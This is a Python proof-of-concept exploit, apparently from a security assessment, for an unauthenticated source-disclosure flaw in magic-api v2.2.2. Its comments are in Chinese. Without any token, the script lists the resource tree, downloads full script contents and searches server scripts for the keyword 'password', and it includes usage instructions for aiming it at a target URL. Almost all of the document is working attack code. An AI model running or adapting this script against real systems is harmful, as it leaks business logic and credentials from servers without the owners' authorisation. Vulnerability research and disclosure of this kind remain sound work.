#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
F-03: 未授权脚本源码泄露 (magic-api v2.2.2)

GET  /magic/web/resource            -> 资源树 (含 id)
GET  /magic/web/resource/file/{id}  -> 完整脚本内容
POST /magic/web/search?keyword=...  -> 全文搜索

无需 token，访问资源文件详情即拿到敏感业务逻辑/凭证。

用法:
  python3 poc_f03_source_disclosure.py http://target:9999
"""
import json
import sys
import urllib.request

BASE = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else 'http://localhost:9999'
WEB = f'{BASE}/magic/web'


def get(url):
    try:
        return json.loads(urllib.request.urlopen(url, timeout=10).read())
    except Exception as e:
        return {'error': str(e)}


def post(url, data):
    req = urllib.request.Request(url, data=data.encode(), headers={'Content-Type': 'application/json'})
    return json.loads(urllib.request.urlopen(req, timeout=10).read())


# 1. 获取资源树
tree = get(f'{WEB}/resource')
print('[+] 资源树 (code):', tree.get('code'))
items = tree.get('data', [])
if isinstance(items, list):
    ids = [item.get('id') for item in items if isinstance(item, dict) and item.get('id')]
    print(f'[+] 资源条目: {len(items)}, 文件 ids: {ids[:10]}')
    # 2. 读取第一个文件全文
    if ids:
        detail = get(f'{WEB}/resource/file/{ids[0]}')
        src = detail.get('data', {})
        print(f'[+] 文件 [{src.get("name")}] 路径: {src.get("path")}')
        print(f'[+] 脚本内容 (前200字): {str(src.get("script",""))[:200]}')
else:
    print('[!] 响应 (非列表):', tree)

# 3. 全文搜索
search = post(f'{WEB}/search', json.dumps({'keyword': 'password', 'timestamp': 0}))
print('[+] 搜索 "password" 结果条目:', len(search.get('data', [])) if search.get('code') == 1 else search.get('message'))
